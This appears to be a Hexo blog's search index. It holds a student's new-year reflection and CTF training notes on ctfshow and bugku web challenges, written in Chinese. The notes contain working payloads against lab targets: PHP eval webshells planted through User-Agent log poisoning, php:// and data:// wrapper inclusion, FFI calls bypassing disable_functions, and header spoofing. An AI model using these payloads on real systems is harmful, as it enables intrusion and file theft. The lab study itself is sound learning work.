<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022, keep surprising</title>
      <link href="/2022/01/02/surprising/"/>
      <url>/2022/01/02/surprising/</url>
      
        <content type="html"><![CDATA[<h2 id="2022，继续古怪"><a href="#2022，继续古怪" class="headerlink" title="2022，继续古怪"></a>2022，继续古怪</h2><p>2022/1/1 7:18 太阳还没出来，人群中部忽然爆发一阵欢呼：“新年快乐！wohooooooo ”那声欢呼让我发现我置身人群，置身2022。</p><p>“不要用任何一个当下定义情绪“</p><p>“不要用任何一个片段定义2021”</p><p>这是当时我脑子里的念头。</p><p>第一天的太阳是在云层里遮掩着出来的。吃了第一顿牛肉粉，买了第一杯酸到爆的果茶，吃了第一顿撑到爆的晚饭。今天过完，就是2022了。</p><ul><li>英语<ul><li>6月，四级考了</li><li>12月，六级也忘记报了</li><li>10月，雅思没做核酸退考了</li></ul></li><li>CTF <ul><li>6月，国赛 狗屎 （实验室通宵留念）</li><li>12月，新生赛over 年审院2 （还是好好学web）</li></ul></li><li>专业<ul><li>7月，高数挂了</li><li>12月，逆向在挂了</li><li>12月，已经变成信安的形状了</li></ul></li><li>课外<ul><li>12月，喜提大创（两天，从0开始的申报书）</li><li>12月HQ奖状集邮完毕。再见新媒体</li><li>11月，跆拳道，从入门到每周末想要入坟。</li></ul></li><li>生活<ul><li>10月，谈了个恋爱，和平拜拜。（谈恋爱大概就是，任何一方没有成本去承担对方的情绪就歇业吧。）</li><li>11月，性向重定位。（真的，有没有被喜欢太好认出来了。但是我真的没有想男女通吃 嘶）</li><li>7月，轻如鸿毛的是生命，重重敲在记忆里的，是不告而别的生命。</li><li>单词 考研-&gt;雅思-&gt;专八（在重背了）</li><li>排球少年 CytusⅡ The House on Mango Street 盛夏未来 of Monsters and Men（看来脑子里除了彩色废料以外确实不剩什么东西了）</li></ul></li><li>undefined<ul><li>做梦梦见自己蹬着轮椅飙车遇到了在海村港口滑行的学长</li><li>礼物收到了“真的乌龟”，在驿站拆开快递盒是三只巴西龟</li><li>10月，看了一场凌波门日出，看了一场花海日落。</li><li>3月，+1的凑单满料奶茶，一杯更比三餐强</li><li>8月，在猫咖尝试在小腿上放冻干吸引笨蛋美女猫猫上钩</li><li>2月，参观dza的生活，想要好好学习不问前路</li><li>6月，在窗台上细数蚊子的住房公摊，大约是1只/平方厘米</li><li>9月，开学回学校数出五只单只的袜子</li><li>b站年度报告，我最爱的视频是python，看了45遍。还没学会。</li><li>没有祝他生日快乐，没有祝他元旦快乐，以后也不了吧，</li></ul></li></ul><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>生活太杂，梦想太稀薄。走了很多未来不太有必要但是依旧在塑造我的路。下一年的关键字是【忍耐】和【投入】。</p><ul><li>目标<ul><li>12点半前睡觉，6:40前起床</li><li>大创</li><li>雅思，冲</li><li>英竞省二以上</li><li>手写日记</li><li>专业课之外，补上前期拉下的。</li><li>跆拳道平原拿下！</li><li>找一座桥</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Hildegarde </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.15</title>
      <link href="/2021/07/17/%E5%AE%9E%E8%AE%AD7-15/"/>
      <url>/2021/07/17/%E5%AE%9E%E8%AE%AD7-15/</url>
      
        <content type="html"><![CDATA[<h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><h5 id="web-source"><a href="#web-source" class="headerlink" title="web source"></a>web source</h5><p>考察扫描 分析</p><p><a href="https://blog.csdn.net/cuddlylm/article/details/118111139">wp</a></p>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/17/hello-world/"/>
      <url>/2021/07/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实训7.16</title>
      <link href="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/"/>
      <url>/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/16</em></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h5 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h5><p><img src="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/hexo\source_posts\实训7-16\QQ截图20210723222345.png"></p><p>新增屏蔽:</p><p>url和ua里的php不转码</p><ul><li><p>修改UA头 执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt; //php被过滤</span><br></pre></td></tr></table></figure><p>关闭UA头 文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?file=/var/log/nginx/access.log</span><br><span class="line">post data: 1=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>flag在fl0g.php里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data:1=system(&#x27;tac fl0g.php&#x27;);</span><br></pre></td></tr></table></figure></li></ul><h5 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h5><p><img src="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/QQ%E6%88%AA%E5%9B%BE20210716115618.png"></p><p>新增屏蔽.</p><p>php里没有后缀名的可控制文件只有session</p><blockquote><p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.14</title>
      <link href="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/"/>
      <url>/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/14</em></p><p>昨天hexo s能显示图片了 部署一晚上没整出来</p><p>今天删了重装 删了重装 好了 口合口合</p><p>重装（散装）虚拟机 装了kali</p><p>重装burpsuitepro 就是每次开机有点怪 但是懒得删了再来了 直接jdk运行吧不然毁灭吧我累惹</p><h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><h5 id="web本地管理员"><a href="#web本地管理员" class="headerlink" title="web本地管理员"></a>web本地管理员</h5><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714172108.png"></p><p>考察XFF绕过</p><ul><li><p>username直接试admin 不论输入啥都是“ip禁止访问”</p><p>甚至数了一下有5000个n试了试密码5000</p><p>看wp 终于在<del>犄角旮旯</del>源代码n的末尾找到一串base64编码<!-- dGVzdDEyMw== -->解得test123</p><ul><li><p>用户名admin 密码test123 用burpsuite抓包修改用户头后重放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Forwarded-For: 127.0.0.1 //加这一行</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>或者直接hackbar修改添加头加上XXF头</p></li></ul></li></ul><h5 id="web-bp"><a href="#web-bp" class="headerlink" title="web bp"></a>web bp</h5><p>尝试一下一周前的新题 没找到可白嫖wp 头铁 冲了</p><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714201941.png" alt="QQ截图20210714201941"></p><p>提示是【弱密码top1000？z?????】看评论区以前是爆破三位就行 现在五位 </p><p>找了下弱密码top1000 很少有五位的</p><p>最后参考了评论区思路 先随便试个密码抓包重放 查看返回的js代码 好 然后我看不懂了 （直接url/success.php会告诉你 no!）</p><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714201743.png"></p><ul><li><p>我grass了 买了wp 果然之前提示是 zxc??? wp都没看完直接试了zxc123</p><p>然后它出来了  (·  · )? 肉疼</p><p>看完wp发现还挺有学习意义的。wp是基于早期的提示zxc???展开的，试一下能不能按照现有的垃圾看代码水平解释清楚。</p><ul><li><p>第一步 尝试密码 抓包重放得到上图的js代码</p><p>原理是：当输入密码错误时，r.code=’bugku10000’ 并且定向到check.php告诉你密码错误；当输入正确密码时，r.code值不再是’bugku10000’ 并且会定向到success.php?code=【正确的值】</p></li><li><p>用户名默认admin 那么根据提示就是爆破密码zxc???的后三位</p><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714222049.png" alt="QQ截图20210714222049"></p><p>第一次尝试纯数字000-999爆破密码后三位得到结果会是这样</p><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714214237.png"></p><p>长度都一样看不出区别。说明正确密码下的code和 ‘bugku10000’ 相同，但是爆破十位不现实。根据原理反推，只要返回的code不是 ‘bugku10000’ 就有可能是正确密码</p></li><li><p>option–&gt;Grep-Match–&gt;add {code:’bugku10000’} </p><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714222037.png"></p><p>找到返回值不是bugku10000的这条 得到密码 输入得到flag</p><p><img src="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/QQ%E6%88%AA%E5%9B%BE20210714222115.png" alt="QQ截图20210714222115"></p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.13</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/</url>
      
        <content type="html"><![CDATA[<p>/test</p><p><code>test</code></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/img-1607482972732af93016f108d3cdb06d0f5fcd5929930.jpg"></p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-13/img-1607482989945d00e0b041615344f3afe228c12a62f2e.jpg" alt="img-1607482989945d00e0b041615344f3afe228c12a62f2e"></p>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.12</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/12</em></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h5 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/image-20210712094647901.png" alt="image-20210712094647901"></p><p>data和php协议都不能用了</p><ul><li><p>日志包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改user agent: &lt;?php eval($_POST[1]);?&gt; 执行 </span><br><span class="line"></span><br><span class="line">然后url/?file=/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line"> post data: 1=system(&quot;ls&quot;); 查看文件目录 发现flag在fl0g.php里</span><br><span class="line"></span><br><span class="line">最后post data: 1=system(&quot;tac fl0g.php&quot;);</span><br></pre></td></tr></table></figure></li></ul><h5 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-12/QQ%E6%88%AA%E5%9B%BE20210716095224.png"></p><p>新增屏蔽：</p><ul><li>80方法可用</li><li>关于url转码 只有get请求里被php包含才会转码 比如UA头里不转码</li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.10</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/10</em></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h5 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h5><ul><li><p>读取目录 脚本绕过限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>flag在flag36.txt里</p><p>利用mysql查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag文件名称&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure></li></ul><h5 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h5><p>沿用上题payload都显示“could not find driver”</p><ul><li><p>读取目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/QQ%E6%88%AA%E5%9B%BE20210710145829.png"></p><p>两个疑似flag文件 flag36x.txt和readflag</p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/QQ%E6%88%AA%E5%9B%BE20210710152239.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$ffi=FFI::cdef(&quot;int system(const char*command);&quot;);</span><br><span class="line">$a=&#x27;/readflag&gt;/var/www/html/1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure><p>然后访问url/1.txt</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=FFI::cdef(&quot;int system(const char *command);&quot;)-&gt;system(&#x27;ls / &gt;&gt; 1.txt&#x27;);</span><br><span class="line">c=FFI::cdef(&quot;int system(const char *command);&quot;)-&gt;system(&#x27;/readflag &gt;&gt; 1.txt&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>PHP7.4的新特性—<a href="https://wiki.php.net/rfc/ffi">FFI</a>，它允许开发者在PHP脚本中调用C函数并使用C数据类型。官方称之为<code>develop “system code” more productively.</code>。有趣的是FFI无视 open_basedir 和 disable_functions 的限制，如果开发者没有很好控制权限，带来的结果会是很糟糕的</p></blockquote></li></ul><h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><h5 id="web-eval"><a href="#web-eval" class="headerlink" title="web eval"></a>web eval</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/image-20210710142455653.png" alt="image-20210710142455653"></p><ul><li><p>闭合掉hello</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?hello=1);show_source(%27flag.php%27);var_dump(2</span><br></pre></td></tr></table></figure></li><li><p>php伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?hello=1);show_source(%27flag.php%27);var_dump(1 </span><br></pre></td></tr></table></figure><p>或者 post data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></li></ul><h5 id="web-变量1-XXXX"><a href="#web-变量1-XXXX" class="headerlink" title="web 变量1 XXXX"></a>web 变量1 XXXX</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/1.png"></p><p><a href="https://blog.csdn.net/qq_38603541/article/details/85106740">https://blog.csdn.net/qq_38603541/article/details/85106740</a></p><ul><li>没看懂 放着先</li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h5 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/3.png"></p><p>无过滤 直接用伪协议</p><ul><li><p>php伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url//?file=php://filter/convert.base64-encode/resource=flag.php //base64转码</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</p><p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p><p>而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p></blockquote><h5 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-10/image-20210710171544089.png" alt="image-20210710171544089"></p><p>php字符不能用 绕过或者用data伪协议</p><ul><li><p>data伪协议（hackbar有）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>并且post data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;tac flag.php&quot;)</span><br></pre></td></tr></table></figure><p>（其实前面应该还有一步ls查看目录）</p><p>或者省去post 用base64转码后直接data伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.9</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/</url>
      
        <content type="html"><![CDATA[<p><em>2021/7/9</em></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h5 id="web58-63"><a href="#web58-63" class="headerlink" title="web58-63"></a>web58-63</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/image-20210709093745897.png" alt="image-20210709093745897"></p><p>没有过滤但是有禁用函数</p><ul><li><p>hackbar post data测试函数 可用有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- c=show_source(&#x27;flag.php&#x27;); //读取文件</span><br><span class="line">- c=file_get_contents(&#x27;flag.php&#x27;);</span><br><span class="line">- c=highlight_file(&#x27;flag.php&#x27;); //通用，没有被禁</span><br></pre></td></tr></table></figure><blockquote><p><em>读取文件函数</em> </p><p>highlight_file($filename);<br>show_source($filename);<br>print_r(php_strip_whitespace($filename));<br>print_r(file_get_contents($filename));<br>readfile($filename);<br>print_r(file($filename)); // var_dump<br>fread(fopen($filename,”r”), $size);<br>include($filename); // 非php代码<br>include_once($filename); // 非php代码<br>require($filename); // 非php代码<br>require_once($filename); // 非php代码<br>print_r(fread(popen(“cat flag”, “r”), $size));<br>print_r(fgets(fopen($filename, “r”))); // 读取一行<br>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF<br>print_r(fgetcsv(fopen($filename,”r”), $size));<br>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记<br>print_r(fscanf(fopen(“flag”, “r”),”%s”));<br>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</p></blockquote></li><li><p>include函数文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><ul><li><p>post data <code>c=include($_GET[1]);</code></p></li><li><p>base64解码</p></li></ul></li><li><p>中国蚁剑通用 密码为c 直接读取文件</p></li></ul><h5 id="web66-70"><a href="#web66-70" class="headerlink" title="web66-70"></a>web66-70</h5><p>flag不在flag.php里在flag.txt里</p><p>打开flag.php “别秀了，这次flag不在这</p><ul><li>```<br>c=print_r(scandir(“/“)); //读取目录 或者用var_dump函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; 读取目录</span><br><span class="line">&gt;</span><br><span class="line">&gt; print_r(glob(&quot;*&quot;)); // 列当前目录</span><br><span class="line">&gt; print_r(glob(&quot;/*&quot;)); // 列根目录</span><br><span class="line">&gt; print_r(scandir(&quot;.&quot;));</span><br><span class="line">&gt; print_r(scandir(&quot;/&quot;));</span><br><span class="line">&gt; $d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">&gt; $d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">&gt; $a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">&gt; $a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  c=highlight_file(&#x27;/flag.txt&#x27;); //读取文件 或者用include函数</span><br></pre></td></tr></table></figure></li></ul><h5 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h5><p>读取flag.txt “？？？？？？？你要上天吗？”</p><ul><li><p>下载附件index.php</p><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/image-20210709145558548.png" alt="image-20210709145558548"></p><p>直接中断eval()后续程序执行 否则字符会被换成 ?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure></li></ul><h5 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/image-20210709152849534.png" alt="image-20210709152849534"></p><p>读取目录发现函数被ban 还有打开文件限制 因为有disabled-functions和open_basedir</p><blockquote><ul><li><p>open_basedir是php.ini中的一个配置选项</p><p>它可将用户访问文件的活动范围限制在指定的区域，</p><p>假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。</p><p>注意用open_basedir指定的限制实际上是前缀,而不是目录名。</p><p>举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p></li><li><p>disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</p></li></ul></blockquote><ul><li><p>继续找没ban函数读取目录 然后读取 post data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>或者post data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=$a=&quot;glob:///*.txt&quot;;        //打开根目录下所有txt文件</span><br><span class="line">if($b=opendir($a))&#123;</span><br><span class="line">while(($file=readdir($b))!==false)&#123;</span><br><span class="line">echo&quot;filename:&quot;.$filename.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">closedir($b);</span><br><span class="line">&#125;</span><br><span class="line">exit();</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/image-20210709154215227.png" alt="image-20210709154215227"></p><p>得到flag在flag0.txt里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag0.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><ul><li>如果有open_basedir限制 脚本绕过<a href="F:\大一\课外\信安\ctfshow\命令执行\web72-74.txt">file</a>  用url编码</li></ul></li></ul><h5 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h5><ul><li><p>读取目录 查看flag文件名–&gt; include文件</p><p>​    73：flagc.txt  74:flagx.txt</p></li></ul><h2 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h2><h5 id="web滑稽"><a href="#web滑稽" class="headerlink" title="web滑稽"></a>web滑稽</h5><p>直接查看源代码</p><h5 id="web你必须让它停下"><a href="#web你必须让它停下" class="headerlink" title="web你必须让它停下"></a>web你必须让它停下</h5><p>查看源码发现有自动刷新页面的函数</p><p>停下来就用抓包 一定有一个有flag的</p><h5 id="web矛盾"><a href="#web矛盾" class="headerlink" title="web矛盾"></a>web矛盾</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-9/1468796-20181129163944903-21726820.png" 